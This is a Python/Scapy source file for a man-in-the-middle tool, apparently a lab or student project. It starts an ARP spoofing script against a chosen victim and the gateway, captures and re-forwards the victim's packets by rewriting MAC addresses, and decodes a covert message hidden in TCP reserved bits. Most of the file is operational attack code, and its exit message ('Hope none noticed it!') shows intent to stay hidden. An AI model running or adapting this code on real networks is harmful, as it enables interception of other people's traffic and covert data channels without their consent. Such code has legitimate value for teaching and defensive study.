import argparse
import subprocess
import atexit

import sys
from scapy.all import *

from utils import kill_subprocess, parse, convert
import scapy.all as scapy
import threading
from queue import deque
import time
from random import randrange
import traceback


class MITM:
    def __init__(
        self,
        interface=None,
        gateway_ip=None,
        victim_ip=None,
        intercept_ip=None,
        mode=None,
        packet_queue=None,
        num_workers=8,
    ):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip

        self.gateway_mac = None
        self.victim_mac = None
        self.attacker_mac = scapy.get_if_hwaddr(interface)

        self.mode = mode
        self.intercept_ip = intercept_ip

        self.packet_queue = packet_queue
        self.message_queue = deque()

        self.l3_socket = scapy.conf.L3socket()
        self.l2_socket = scapy.conf.L2socket()

        self.num_workers = num_workers

        self.passthrough_queue = deque()

        self.syn_received = False
        self.ack_sent = False
        self.base64_table = (
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        )

        self.received_message = ""
        self.decoded_message = ""

    def get_mac(self, ip_addr):
        """Finds out the MAC Address of any IP Address on the LAN

        Args:
            ip_addr (str): The IP Address to scan for.

        Returns:
            "string": the MAC address for the provided IP Address
        """
        # create an arp packet, setting ip_addr as destination
        arp_req = scapy.ARP(pdst=ip_addr)

        # set the destination mac to broadcast
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        # combine both
        arp_req_broadcast = broadcast / arp_req

        # send the packet
        answers = scapy.srp(
            arp_req_broadcast, timeout=10, verbose=False, iface=self.interface
        )[0]

        # get the mac from the answers
        return answers[0][1].hwsrc

    def string_to_base64(self, input_string):
        # Encode the input string to base64
        encoded_bytes = base64.b64encode(input_string.encode("utf-8"))

        # Convert the encoded bytes to a string
        base64_string = encoded_bytes.decode("utf-8")

        return base64_string

    def base64_to_number(self, b64_string):
        ## remove the = from the base64 string because we only have 6 bits,
        # and the "=" overflows it to 65 which is <2^6

        b64_string = b64_string.replace("=", "")
        numbers = [self.base64_table.index(character) for character in b64_string]
        return numbers

    def construct_message(self, message_to_send):
        ## encode to base64
        b64_repr = self.string_to_base64(message_to_send)

        ## convert to base64
        list_nums = self.base64_to_number(b64_repr)

        ## change all of them to binary representation
        bin_reprns = [format(num, "b") for num in list_nums]

        ## put everything in the queue
        _ = [self.message_queue.appendleft(bin_reprn) for bin_reprn in bin_reprns]
        return bin_reprns

    def capture_packets(self):
        """Uses Scapy's packet capturing to intercept and print packets"""
        try:
            scapy.sniff(
                filter=f"ip and (host {self.victim_ip} or host {self.gateway_ip} or host {self.intercept_ip})",
                iface=self.interface,
                prn=self.add_to_queue,
                store=False,
            )
        except KeyboardInterrupt:
            self.shutdown()

    def add_to_queue(self, packet):
        """Add the packet into the dequeue queue

        Args:
            packet (scapy.packet): scapy packet sniffed from the interface
        """
        try:
            # print("[+] Packet at the start of the queue", packet.summary())
            ## Don't do anything to packets sent by the attacker mac address
            ## Or if they have the right victim_mac and victim_ip
            if scapy.ICMP in packet and packet[scapy.Ether].src != self.attacker_mac:
                self.passthrough_queue.append(packet)
            elif (scapy.IP in packet) and (
                packet[scapy.Ether].src == self.attacker_mac
                and (
                    (
                        packet[scapy.IP].dst == self.victim_ip
                        and packet[scapy.Ether].dst == self.victim_mac
                    )
                    or (packet[scapy.IP].dst == self.intercept_ip)
                )
            ):
                # print("[+] Skipping Packet")
                return
            elif self.intercept_ip in [packet[scapy.IP].src or packet[scapy.IP].dst]:
                # print("[+] Added the packet into the queue")
                # print("[+] Packet", packet.summary())
                self.packet_queue.append(packet)
            else:
                self.passthrough_queue.append(packet)

        except Exception as e:
            print(Exception, e)
            traceback.print_exc()

    def shutdown(self):
        """Exit the program.
        TODO: Graceful exit
        """

        print("[+] Exiting! Hope none noticed it!")
        sys.exit(0)

    def number_to_base64(self, num):
        """Converts a number to a base64 string"""
        # Convert the number to base64 using the defined table
        base64_string = ""
        while num > 0:
            num, index = divmod(num, 64)
            base64_string = self.base64_table[index] + base64_string

        return base64_string

    def decode_packet_data(self, packet):
        # Extract reserved and flags from the packet
        reserved = packet.reserved
        flags = packet.flags

        # Convert reserved and flags to binary strings
        reserved_bin = format(reserved, "03b")
        flags_bin = format(flags >> 6, "03b")

        # Combine binary strings and convert to base64 string
        combined_bin = reserved_bin + flags_bin
        combined_base64 = self.number_to_base64(int(combined_bin, 2))

        return base64.b64decode(combined_base64).decode("utf-8")

    def process_packet(self):
        """Checks if we are interested in the packet

        Args:
            packet (scapy.packet): the packet to be processed
        """

        l2_socket = scapy.conf.L2socket()

        while True:
            try:
                packet = self.packet_queue.pop()

                if scapy.ICMP in packet and packet[scapy.ICMP].type == 8:
                    # pass it to the process packet
                    print("[+] Processing ICMP")
                    self.forward_packet(packet=packet, l2_socket=l2_socket)
                    continue
                else:
                    if self.mode == "debug":
                        if packet[scapy.IP].src == self.victim_ip and packet[
                            scapy.IP
                        ].dst in [
                            self.gateway_ip,
                            self.intercept_ip,
                        ]:
                            # print("Debug Forwarding: ", packet.summary())
                            # self.l2_socket.send(packet)

                            self.forward_packet(packet, l2_socket)
                        elif (
                            packet[scapy.IP].src == self.victim_ip
                            or packet[scapy.IP].dst == self.victim_ip
                        ):
                            # print("SRC OR DST Matched:", packet.summary())
                            self.forward_packet(packet, l2_socket)

                            # self.l3_socket.send(packet)

                    elif (
                        self.mode == "receiver"
                        and packet[scapy.IP].src == self.intercept_ip
                        and not (packet[scapy.TCP].flags & 0x04)
                    ):
                        print("[+] Intercepted packet", packet.summary())
                        if self.decoded_message.endswith("thompson"):
                            # final = parse(self.received_message)
                            print(
                                "[+] The covert message is: ",
                                self.decoded_message.replace("thompson", ""),
                            )
                            self.shutdown()
                        self.received_message += convert(packet[scapy.TCP].reserved)
                        self.decoded_message += parse(self.received_message)
                        print("[+] Message is ", self.decoded_message)

                        # if syn_received == False:
            # 	self.forward_packet(packet, l2_socket)
            # 	continue
            # else:
            # 	self.decode_packet_data(packet)
            # 	self.forward_packet(packet, l2_socket)
            # 	continue

            # elif syn_received == False and packet[scapy.IP].dst == self.intercept_ip and packet[scapy.IP].src == self.victim_ip:
            # 	## if received syn but want to send ack then send ack
            #     packet[scapy.TCP].flags = "A"
            # 	self.forward_packet(packet, l2_socket)
            # 	self.ack_sent = True
            # else:
            #     print("[+] Forwarding Packet with L3")
            #     self.l3_socket.send(packet)
            except IndexError:
                # print("[-] Queue is empty!")
                ## randomly sleep between 1ms to 1000ms (1 second)
                time.sleep(randrange(1, 10) / 100000)
                pass

            except Exception as e:
                print("[-] Error while processing packet: ", e)

    def process_passthrough(self):
        """Checks if we are interested in the packet

        Args:
            packet (scapy.packet): the packet to be processed
        """

        l2_socket = scapy.conf.L2socket()

        while True:
            try:
                packet = self.passthrough_queue.pop()
                self.forward_packet(packet, l2_socket)

            except IndexError:
                # print("[-] Queue is empty!")
                ## randomly sleep between 1ms to 1000ms (1 second)
                time.sleep(randrange(1, 10) / 100000)

            except Exception as e:
                print("[-] Error while forwarding packet: ", e)

    def forward_packet(self, packet, l2_socket):
        """Forwards packet by rewriting their mac addresses

        Args:
            packet (scapy.packet): forward packet by rewriting their mac addresses`
        """
        # Check if the packet has an IP layer
        if scapy.IP in packet:
            # print("[+] Unmodified packet")
            # print(packet.show())

            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst

            # Check if the source IP matches gateway_ip
            if src_ip == self.victim_ip:
                # Modify the MAC address in the Ethernet layer
                packet[scapy.Ether].src = self.attacker_mac
                packet[scapy.Ether].dst = self.gateway_mac

            # Check if the source IP matches victim_ip
            elif dst_ip == self.victim_ip:
                # Modify the MAC address in the Ethernet layer
                packet[scapy.Ether].dst = self.victim_mac
                packet[scapy.Ether].src = self.attacker_mac

            # print("[+] Forwarding the packet with L2 Socket")

            # Forward the modified packet
            # print(packet.show())
            try:
                l2_socket.send(packet)
            except OSError:
                ## OSError: [Errno 90] Message too long
                ## we can safely ignore it
                pass
            except Exception as e:
                print("[-] Error while forwarding packet: ", e)

    def spawn_passthrough_threads(self):
        """Spawns worker threads to process packets"""
        # Create a list to store thread objects
        threads = []

        for i in range(int(self.num_workers / 2)):
            # Create a thread for each iteration
            thread = threading.Thread(target=self.process_passthrough)

            # Daemonize the thread so it gets killed
            thread.daemon = True

            # Start the thread
            thread.start()

            # Append the thread object to the list
            threads.append(thread)

            print(f"[+] Passthrough-Thread-{i} started")

        return threads

    def spawn_worker_threads(self):
        """Spawns worker threads to process packets"""
        # Create a list to store thread objects
        threads = []

        # Loop to spawn threads
        for i in range(int(self.num_workers / 2)):
            # Create a thread for each iteration
            thread = threading.Thread(target=self.process_packet)

            # Daemonize the thread so it gets killed
            thread.daemon = True

            # Start the thread
            thread.start()

            # Append the thread object to the list
            threads.append(thread)

            print(f"[+] Worker-Thread-{i} started")

        return threads

    def __call__(self):
        try:
            self.victim_mac = self.get_mac(self.victim_ip)
            print("[+] Victim Mac is", self.victim_mac)
        except Exception as e:
            print("[-] Error: Could not find Victim MAC: ", str(e))
            print("[+] Exiting")
            sys.exit(1)

        try:
            self.gateway_mac = self.get_mac(self.gateway_ip)
            print("[+] Gateway Mac is", self.gateway_mac)
        except Exception as e:
            print("[-] Error: Could not find gateway MAC: ", str(e))
            print("[+] Exiting")
            sys.exit(1)

        spoofer_process = subprocess.Popen(
            [
                "python",
                "spoofer.py",
                "-i",
                self.interface,
                "-t",
                self.victim_ip,
                "-g",
                self.gateway_ip,
            ],
            stdout=subprocess.DEVNULL,
        )
        atexit.register(kill_subprocess, spoofer_process)

        # Start a process for packet capturing
        packet_capture_process = threading.Thread(target=self.capture_packets)
        packet_capture_process.daemon = True
        packet_capture_process.start()

        self.spawn_worker_threads()

        self.spawn_passthrough_threads()

        packet_capture_process.join()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--interface", help="the interface to use", required=True)
    parser.add_argument("-t", "--target", help="the target ip to spoof", required=True)
    parser.add_argument(
        "-g", "--gateway", help="the gateway ip for the network", required=True
    )
    parser.add_argument(
        "-d", "--destination", help="the other end of the covert channel", required=True
    )
    parser.add_argument("-m", "--mode", help="mode: debug", required=True)
    parser.add_argument(
        "-nt",
        "--num_threads",
        help="number of threads to use, default 4",
        const=4,
        type=int,
        nargs="?",
        required=False,
    )

    args = parser.parse_args()

    spoofer_process = subprocess.Popen(
        [
            "python",
            "spoofer.py",
            "-i",
            args.interface,
            "-t",
            args.target,
            "-g",
            args.gateway,
        ],
        stdout=subprocess.DEVNULL,
    )
    atexit.register(kill_subprocess, spoofer_process)

    mitm = MITM(
        gateway_ip=args.gateway,
        victim_ip=args.target,
        interface=args.interface,
        intercept_ip=args.destination,
        mode=args.mode,
        packet_queue=deque(),
        num_workers=args.num_threads,
    )
    mitm()
